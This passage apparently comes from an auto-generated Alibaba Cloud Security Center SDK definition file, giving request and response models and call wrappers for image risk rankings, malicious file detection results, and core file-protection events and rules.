eakPWNum\\\\":0}'),
        tag?: string(name='Tag', description='Image tag.', example='machineResource'),
        uuid?: string(name='Uuid', description='Uuid.', example='5583aa03-922e-4709-a888-389f2489****'),
        vulCount?: int32(name='VulCount', description='Number of detected vulnerabilities.', example='1'),
      }
    ](name='Baseline', description='Baseline risk information.'),
    vulAsap?: [ 
      {
        digest?: string(name='Digest', description='Image Digest value.', example='d97c1348e56eb52902888e6e5673623321b1f19ac45ed532c3114dc0f989****'),
        hcCount?: int32(name='HcCount', description='Number of risks in the image repository.', example='0'),
        imageId?: string(name='ImageId', description='Image ID.', example='fabe4203a89765a2c99554040bda51eac7885a18216f4ac0be82710cff60****'),
        imageSize?: long(name='ImageSize', description='Image size.', example='1024'),
        repoName?: string(name='RepoName', description='Name of the image repository.', example='lkl-zf-ss-ordapi-labs'),
        repoNamespace?: string(name='RepoNamespace', description='Namespace of the image repository.', example='namespace-01'),
        riskLevelDetail?: string(name='RiskLevelDetail', description='Risk statistics for all hosts, images, and containers.', example='{\\\\"account\\\\":0,\\\\"agentlessAll\\\\":0,\\\\"agentlessBaseline\\\\":0,\\\\"agentlessMalicious\\\\":0,\\\\"agentlessSensitiveFile\\\\":0,\\\\"agentlessVulCve\\\\":0,\\\\"agentlessVulSca\\\\":0,\\\\"agentlessVulSys\\\\":0,\\\\"appNum\\\\":0,\\\\"asapVulCount\\\\":0,\\\\"baselineHigh\\\\":0,\\\\"baselineLow\\\\":0,\\\\"baselineMedium\\\\":0,\\\\"baselineNum\\\\":0,\\\\"cmsNum\\\\":0,\\\\"containerAsap\\\\":0,\\\\"containerLater\\\\":0,\\\\"containerNntf\\\\":0,\\\\"containerRemind\\\\":0,\\\\"containerSerious\\\\":0,\\\\"containerSuspicious\\\\":0,\\\\"cveNum\\\\":513,\\\\"emgNum\\\\":0,\\\\"health\\\\":0,\\\\"imageBaselineHigh\\\\":0,\\\\"imageBaselineLow\\\\":0,\\\\"imageBaselineMedium\\\\":0,\\\\"imageBaselineNum\\\\":0,\\\\"imageMaliciousFileRemind\\\\":0,\\\\"imageMaliciousFileSerious\\\\":0,\\\\"imageMaliciousFileSuspicious\\\\":0,\\\\"imageVulAsap\\\\":3,\\\\"imageVulLater\\\\":182,\\\\"imageVulNntf\\\\":328,\\\\"laterVulCount\\\\":0,\\\\"newSuspicious\\\\":0,\\\\"nntfVulCount\\\\":0,\\\\"remindNum\\\\":0,\\\\"scaNum\\\\":0,\\\\"seriousNum\\\\":0,\\\\"suspNum\\\\":0,\\\\"suspicious\\\\":0,\\\\"sysNum\\\\":0,\\\\"trojan\\\\":0,\\\\"uuid\\\\":\\\\"44ffb29d6f66d8509598bcdfa660a21d\\\\",\\\\"vul\\\\":513,\\\\"weakPWNum\\\\":0}'),
        tag?: string(name='Tag', description='Image tag.', example='app:app01-ubuntu'),
        uuid?: string(name='Uuid', description='The identifier for this record.', example='6636c286-8063-4c97-8508-6aaf16a8****'),
        vulCount?: int32(name='VulCount', description='Number of vulnerabilities.', example='1'),
      }
    ](name='VulAsap', description='High-risk vulnerability risk information.'),
  }(name='RiskRankInfo', description='Risk information.'),
}

model GetDockerhubImageRiskRankInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetDockerhubImageRiskRankInfoResponseBody(name='body'),
}

/**
 * @summary Query Image Ranking Across Dimensions.
 *
 * @param request GetDockerhubImageRiskRankInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetDockerhubImageRiskRankInfoResponse
 */
async function getDockerhubImageRiskRankInfoWithOptions(request: GetDockerhubImageRiskRankInfoRequest, runtime: Util.RuntimeOptions): GetDockerhubImageRiskRankInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetDockerhubImageRiskRankInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query Image Ranking Across Dimensions.
 *
 * @param request GetDockerhubImageRiskRankInfoRequest
 * @return GetDockerhubImageRiskRankInfoResponse
 */
async function getDockerhubImageRiskRankInfo(request: GetDockerhubImageRiskRankInfoRequest): GetDockerhubImageRiskRankInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getDockerhubImageRiskRankInfoWithOptions(request, runtime);
}

model GetDockerhubImageRiskStatisticRequest {
  types?: [ string ](name='Types', description='The types of image risks to be queried.'),
}

model GetDockerhubImageRiskStatisticResponseBody = {
  requestId?: string(name='RequestId', description='The ID of this call request, which is a unique identifier generated by Alibaba Cloud for the request and can be used for troubleshooting and problem localization.', example='7532B7EE-7CE7-5F4D-BF04-B12447DD****'),
  riskRankInfo?: {
    baseline?: int32(name='Baseline', description='Number of baseline issue risks.', example='1'),
    scanTime?: long(name='ScanTime', description='Scan timestamp.', example='1693997625000'),
    scanTimeTimestamp?: long(name='ScanTimeTimestamp', description='Scan timestamp.', example='1693997625000'),
    totalScanned?: int32(name='TotalScanned', description='Count of scanned Dockerhub images.', example='1'),
    vulAsap?: int32(name='VulAsap', description='Number of high-risk vulnerabilities.', example='1'),
  }(name='RiskRankInfo', description='Risk source information.'),
}

model GetDockerhubImageRiskStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetDockerhubImageRiskStatisticResponseBody(name='body'),
}

/**
 * @summary Query the statistical counts of images across various dimensions.
 *
 * @param request GetDockerhubImageRiskStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetDockerhubImageRiskStatisticResponse
 */
async function getDockerhubImageRiskStatisticWithOptions(request: GetDockerhubImageRiskStatisticRequest, runtime: Util.RuntimeOptions): GetDockerhubImageRiskStatisticResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetDockerhubImageRiskStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Query the statistical counts of images across various dimensions.
 *
 * @param request GetDockerhubImageRiskStatisticRequest
 * @return GetDockerhubImageRiskStatisticResponse
 */
async function getDockerhubImageRiskStatistic(request: GetDockerhubImageRiskStatisticRequest): GetDockerhubImageRiskStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getDockerhubImageRiskStatisticWithOptions(request, runtime);
}

model GetFileDetectApiInvokeInfoResponseBody = {
  data?: {
    authCount?: long(name='AuthCount', description='The total number of authorizations.', example='10000'),
    expire?: long(name='Expire', description='The timestamp of the expiration date of the authorization number.', example='1815753600000'),
    flowRate?: int32(name='FlowRate', description='The frequency of calls.', example='20'),
    remainAuthCount?: long(name='RemainAuthCount', description='The number of remaining authorizations.', example='900'),
    saleVersion?: int32(name='SaleVersion', description='The Authorized Version. Valid values include:

* **1:** trial version
* **2:** Enterprise Edition', example='2'),
    timeUnit?: string(name='TimeUnit', description='The time unit of the frequency limit. Value:

* **SECONDS**
* **MINUTES**', example='SECONDS'),
  }(name='Data', description='Returns the response body.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9f368b6e-d60a-43c5-bd6f-c7087f2d****'),
}

model GetFileDetectApiInvokeInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileDetectApiInvokeInfoResponseBody(name='body'),
}

/**
 * @summary Obtains the usage information of the malicious file detection SDK.
 *
 * @param request GetFileDetectApiInvokeInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileDetectApiInvokeInfoResponse
 */
async function getFileDetectApiInvokeInfoWithOptions(runtime: Util.RuntimeOptions): GetFileDetectApiInvokeInfoResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetFileDetectApiInvokeInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains the usage information of the malicious file detection SDK.
 *
 * @return GetFileDetectApiInvokeInfoResponse
 */
async function getFileDetectApiInvokeInfo(): GetFileDetectApiInvokeInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectApiInvokeInfoWithOptions(runtime);
}

model GetFileDetectReportRequest {
  eventId?: long(name='EventId', description='The event ID that corresponds to the file to be detected.', example='81****'),
  field?: string(name='Field', description='The field that you want to query. You can enter multiple fields and separate them with commas (,).

Valid values:

*   **ThreatTypes**: the type of the threat intelligence event
*   **Intelligences**: the threat intelligence event
*   **ThreatLevel**: the level of the threat intelligence event
*   **Basic**: the basic information about the report (the scan result)
*   **Sandbox**: the cloud sandbox check report', example='Basic,,ThreatTypes,Intelligences,Sandbox'),
  fileHash?: string(name='FileHash', description='The hash value of the file to be detected.', example='b63917332950e5d219d0737ffe31****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  sourceType?: string(name='SourceType', description='The data source type. Valid values:

*   **machine**: host alerts
*   **object_scan**: file detection alerts', example='object_scan'),
}

model GetFileDetectReportResponseBody = {
  code?: string(name='Code', description='The status code that is returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    basic?: string(name='Basic', description='The basic information about the detected file.', example='{
        "sha256": "",
        "sha512": "",
        "source": "aegis",
        "gmt_first_submit": "",
        "sha1": "",
        "virus_result": "",
        "webshell_result": "",
        "gmt_update": "",
        "sandbox_result": "2",
        "fileSize": "363752",
        "virus_name": "",
    }'),
    fileHash?: string(name='FileHash', description='The hash value of the file.', example='c42b5f6bde0b730ece2923266333****'),
    filename?: string(name='Filename', description='The name of the file.', example='test.zip'),
    hasData?: boolean(name='HasData', description='Indicates whether the file data exists in the cloud sandbox. Valid values:

*   **true**
*   **false**', example='true'),
    intelligences?: string(name='Intelligences', description='The threat intelligence event, which is a JSON array.

Valid values:

*   The threat type. The value is an array. The elements in the array can be DDoS trojans, mining programs, network layer intrusions, network service scans, network sharing and discovery, mining pools, exploits, dark webs, malicious logons, malicious download sources, C\\\\&C servers, webshells, and web attacks.', example='["The threat type"]'),
    sandbox?: string(name='Sandbox', description='The details of the cloud sandbox check results.', example='{\\\\"BehaviorData\\\\": {}, \\\\"ProcessData\\\\": {}, \\\\"SandboxData\\\\": {}, \\\\"AttackData\\\\": [], \\\\"NetworkData\\\\": {}, \\\\"SolutionData\\\\": {}, \\\\"FileData\\\\": {}}'),
    showTab?: boolean(name='ShowTab', description='Indicates whether the check report is displayed. Valid values:

*   **true**
*   **false**', example='true'),
    threatLevel?: long(name='ThreatLevel', description='The threat level. Valid values:

*   **0**: normal
*   **1**: suspicious
*   **2**: high', example='2'),
    threatTypes?: string(name='ThreatTypes', description='The risk tags and server tags that are generated by analyzing threat intelligence and security events. The value is a string array. The array includes the following elements:

*   **threat_type_desc**: the threat type.
*   **last_find_time**: the last time the threat was detected.
*   **risk_type**: indicates whether the tag is malicious. The value 0 indicates that the tag is not malicious. The value 1 indicates that the tag is malicious. The value -1 indicates that whether the tag type is malicious is unknown.
*   **threat_type**: the threat type. The value is an array. The elements in the array can be network layer intrusion, network service scanning, network sharing and discovery, mining pool, exploits, darknet, malicious logon, malicious download source, central control, web shell, and web attack.', example='[{"threat_type_desc": "test","risk_type": 1,"threat_type": ""}]'),
  }(name='Data', description='The response parameters.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393XXXX'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetFileDetectReportResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileDetectReportResponseBody(name='body'),
}

/**
 * @summary Queries the cloud sandbox check results of malicious files.
 *
 * @param request GetFileDetectReportRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileDetectReportResponse
 */
async function getFileDetectReportWithOptions(request: GetFileDetectReportRequest, runtime: Util.RuntimeOptions): GetFileDetectReportResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventId)) {
    query['EventId'] = request.eventId;
  }
  if (!Util.isUnset(request.field)) {
    query['Field'] = request.field;
  }
  if (!Util.isUnset(request.fileHash)) {
    query['FileHash'] = request.fileHash;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceType)) {
    query['SourceType'] = request.sourceType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileDetectReport',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the cloud sandbox check results of malicious files.
 *
 * @param request GetFileDetectReportRequest
 * @return GetFileDetectReportResponse
 */
async function getFileDetectReport(request: GetFileDetectReportRequest): GetFileDetectReportResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectReportWithOptions(request, runtime);
}

model GetFileDetectResultRequest {
  hashKeyList?: [ string ](name='HashKeyList', description='The identifiers of files. Only MD5 hash values are supported.

This parameter is required.'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='183.46.XX.XX'),
  type?: int32(name='Type', description='The type of the file. Valid values:

*   **0**: unknown file
*   **1**: binary file
*   **2**: webshell file
*   **4**: script file

> If you do not know the type of the file, set this parameter to 0.

This parameter is required.', example='0'),
}

model GetFileDetectResultResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
  resultList?: [ 
    {
      code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
      compress?: boolean(name='Compress', description='Whether to identify as a compressed package. Valid values:
- **true**: Yes.
- **false**: No.', example='false'),
      ext?: string(name='Ext', description='The extended information about the file detection result.', example='{"HighLight":[[23245,23212]]}'),
      hashKey?: string(name='HashKey', description='The identifier of the file. Only MD5 hash values are supported.', example='0a212417e65c26ff133cfff28f6c****'),
      message?: string(name='Message', description='The error message returned.', example='successful'),
      result?: int32(name='Result', description='The file detection result. Valid values:

*   **0**: The file is normal.
*   **1**: The file is suspicious.
*   **3**: The detection is in progress.', example='0'),
      score?: int32(name='Score', description='The score of file detection result.

> A higher score indicates a more suspicious file.', example='100'),
      virusType?: string(name='VirusType', description='The type of the virus. Valid values:

*   **Trojan**: trojan horse
*   **WebShell**: webshell
*   **Backdoor**: backdoor program
*   **RansomWare**: ransomware
*   **Scanner**: scanner
*   **Stealer**: tool that is used to steal information
*   **Malbaseware**: tainted basic software
*   **Hacktool**: attacker tool
*   **Engtest**: engine test program
*   **Downloader**: trojan downloader
*   **Virus**: infectious virus
*   **Miner**: mining program
*   **Worm**: worm
*   **DDoS**: DDoS trojan
*   **Malware**: malicious program
*   **RiskWare**: software that has risks
*   **Proxytool**: proxy
*   **Suspicious**: suspicious program
*   **MalScript**: malicious script
*   **Rootkit**: rootkit
*   **Exploit**: exploit', example='WEBSHELL'),
    }
  ](name='ResultList', description='An array that consists of file detection results.'),
}

model GetFileDetectResultResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileDetectResultResponseBody(name='body'),
}

/**
 * @summary Obtains file detection results.
 *
 * @description The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
 *
 * @param request GetFileDetectResultRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileDetectResultResponse
 */
async function getFileDetectResultWithOptions(request: GetFileDetectResultRequest, runtime: Util.RuntimeOptions): GetFileDetectResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.hashKeyList)) {
    query['HashKeyList'] = request.hashKeyList;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileDetectResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Obtains file detection results.
 *
 * @description The HashKey parameter is included in all API operations that are related to the file detection feature. The parameter specifies the unique identifier of a file. Only MD5 hash values are supported. Before you call this operation, calculate the MD5 hash value of the file.
 *
 * @param request GetFileDetectResultRequest
 * @return GetFileDetectResultResponse
 */
async function getFileDetectResult(request: GetFileDetectResultRequest): GetFileDetectResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileDetectResultWithOptions(request, runtime);
}

model GetFileProtectDashboardResponseBody = {
  data?: {
    enableRuleCount?: int32(name='EnableRuleCount', description='The total number of enabled rules.', example='12'),
    pluginCount?: int32(name='PluginCount', description='The total number of servers on which the Security Center agent is installed.', example='12'),
    pluginOfflineCount?: int32(name='PluginOfflineCount', description='The total number of servers on which the Security Center agent is offline.', example='1'),
    pluginOnlineCount?: int32(name='PluginOnlineCount', description='The total number of servers on which the Security Center agent is online.', example='11'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
}

model GetFileProtectDashboardResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileProtectDashboardResponseBody(name='body'),
}

/**
 * @summary Queries information about the core file monitoring feature, including the number of effective rules and the installation status of the Security Center agent on servers.
 *
 * @param request GetFileProtectDashboardRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileProtectDashboardResponse
 */
async function getFileProtectDashboardWithOptions(runtime: Util.RuntimeOptions): GetFileProtectDashboardResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetFileProtectDashboard',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the core file monitoring feature, including the number of effective rules and the installation status of the Security Center agent on servers.
 *
 * @return GetFileProtectDashboardResponse
 */
async function getFileProtectDashboard(): GetFileProtectDashboardResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileProtectDashboardWithOptions(runtime);
}

model GetFileProtectEventRequest {
  id?: long(name='Id', description='The ID of the event.', example='12'),
}

model GetFileProtectEventResponseBody = {
  data?: {
    alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='1'),
    cmdLine?: string(name='CmdLine', description='The event command line.', example='["touch","/usr/local/aaaa"]'),
    filePath?: string(name='FilePath', description='The path to the file.', example='/usr/local'),
    filePermission?: string(name='FilePermission', description='The permissions to run the process.', example='rwxr-xr-x'),
    firstTime?: long(name='FirstTime', description='The timestamp at which the event was first detected.', example='1694576692000'),
    handleTime?: long(name='HandleTime', description='The time when the event was handled.', example='1694576692000'),
    id?: long(name='Id', description='The ID of the event.', example='55037'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='10.42.XX.XX'),
    latestTime?: long(name='LatestTime', description='The time when the event last occurred.', example='1694576692000'),
    operation?: string(name='Operation', description='The operation that the process performed on the file.', example='DELETE'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
    procPath?: string(name='ProcPath', description='The path to the process.', example='/bin/bash33'),
    processId?: string(name='ProcessId', description='The process ID of the event.', example='3453'),
    remark?: string(name='Remark', description='The remarks.', example='["test"]'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test-000'),
    status?: int32(name='Status', description='The status of the event. Valid values:

*   0: not handled
*   1: handled
*   2: added to the whitelist', example='1'),
    uuid?: string(name='Uuid', description='The UUID of the asset.', example='49f1360f-62c8-4b48-a24c-5cc317656419'),
  }(name='Data', description='The details of the returned data.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model GetFileProtectEventResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileProtectEventResponseBody(name='body'),
}

/**
 * @summary Queries information about core file monitoring events.
 *
 * @param request GetFileProtectEventRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileProtectEventResponse
 */
async function getFileProtectEventWithOptions(request: GetFileProtectEventRequest, runtime: Util.RuntimeOptions): GetFileProtectEventResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileProtectEvent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about core file monitoring events.
 *
 * @param request GetFileProtectEventRequest
 * @return GetFileProtectEventResponse
 */
async function getFileProtectEvent(request: GetFileProtectEventRequest): GetFileProtectEventResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileProtectEventWithOptions(request, runtime);
}

model GetFileProtectEventCountRequest {
  status?: int32(name='Status', description='The status of the event. Valid values:

*   0: unhandled
*   1: handled', example='1'),
}

model GetFileProtectEventCountResponseBody = {
  data?: int32(name='Data', description='The data returned if the request is successful.', example='16'),
  requestId?: string(name='RequestId', description='The request ID.', example='9B28EC81-2FA7-5097-80D9-0DBE1A3DBD59'),
}

model GetFileProtectEventCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileProtectEventCountResponseBody(name='body'),
}

/**
 * @summary Queries the total number of core file monitoring events by filter condition.
 *
 * @param request GetFileProtectEventCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileProtectEventCountResponse
 */
async function getFileProtectEventCountWithOptions(request: GetFileProtectEventCountRequest, runtime: Util.RuntimeOptions): GetFileProtectEventCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileProtectEventCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the total number of core file monitoring events by filter condition.
 *
 * @param request GetFileProtectEventCountRequest
 * @return GetFileProtectEventCountResponse
 */
async function getFileProtectEventCount(request: GetFileProtectEventCountRequest): GetFileProtectEventCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileProtectEventCountWithOptions(request, runtime);
}

model GetFileProtectRuleRequest {
  id?: long(name='Id', description='The ID of the rule.', example='245'),
}

model GetFileProtectRuleResponseBody = {
  data?: {
    action?: string(name='Action', description='The handling method of the rule. Valid values:

1.  pass: allow
2.  alert', example='pass'),
    alertLevel?: int32(name='AlertLevel', description='The severity of alerts. Valid values:

*   0: does not generate alerts
*   1: sends notifications
*   2: suspicious
*   3: high-risk', example='0'),
    fileOps?: [ string ](name='FileOps', description='The operations performed on the files.'),
    filePaths?: [ string ](name='FilePaths', description='The paths to the monitored files.'),
    id?: long(name='Id', description='The ID of the rule.', example='44616'),
    platform?: string(name='Platform', description='The type of the operating system. Valid values:

*   **windows**: Windows
*   **linux**: Linux', example='linux'),
    procPaths?: [ string ](name='ProcPaths', description='The paths to the monitored processes.'),
    ruleName?: string(name='RuleName', description='The name of the rule.', example='test-000'),
    status?: int32(name='Status', description='The status of the rule. Valid values:

1.  0: disabled
2.  1: enabled', example='1'),
    switchId?: string(name='SwitchId', description='The switch ID of the rule.', example='FILE_PROTECT_RULE_SWITCH_TYPE_0000'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='C0DF9057-67C5-574D-A2D2-0CA9AC74C4D3'),
}

model GetFileProtectRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileProtectRuleResponseBody(name='body'),
}

/**
 * @summary Queries the information about a core file monitoring rule based on the ID of the rule.
 *
 * @param request GetFileProtectRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileProtectRuleResponse
 */
async function getFileProtectRuleWithOptions(request: GetFileProtectRuleRequest, runtime: Util.RuntimeOptions): GetFileProtectRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetFileProtectRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a core file monitoring rule based on the ID of the rule.
 *
 * @param request GetFileProtectRuleRequest
 * @return GetFileProtectRuleResponse
 */
async function getFileProtectRule(request: GetFileProtectRuleRequest): GetFileProtectRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileProtectRuleWithOptions(request, runtime);
}

model GetFileUploadLimitResponseBody = {
  data?: {
    limit?: string(name='Limit', description='The QPS limit on the files uploaded from the client.', example='100'),
  }(name='Data', description='The data returned if the request is successful.'),
  requestId?: string(name='RequestId', description='The request ID.', example='1A975D03-5F49-5354-B2CB-3918D5DA431A'),
}

model GetFileUploadLimitResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetFileUploadLimitResponseBody(name='body'),
}

/**
 * @summary Queries the queries per second (QPS) limit on the files uploaded from the client.
 *
 * @param request GetFileUploadLimitRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetFileUploadLimitResponse
 */
async function getFileUploadLimitWithOptions(runtime: Util.RuntimeOptions): GetFileUploadLimitResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetFileUploadLimit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the queries per second (QPS) limit on the files uploaded from the client.
 *
 * @return GetFileUploadLimitResponse
 */
async function getFileUploadLimit(): GetFileUploadLimitResponse {
  var runtime = new Util.RuntimeOptions{};
  return getFileUploadLimitWithOptions(runtime);
}

model GetFunctionTrialStatusRequest {
  functionName?: string(name='FunctionName', description='The name of the function module.', example='trail_file_detect_api_reward'),
}

model GetFunctionTrialStatusResponseBody = {
  data?: int32(name='Data', description='Indicates eligibility. Values:

- **0**: Eligible
- **1**: Not eligible
- **2**: Trial ended
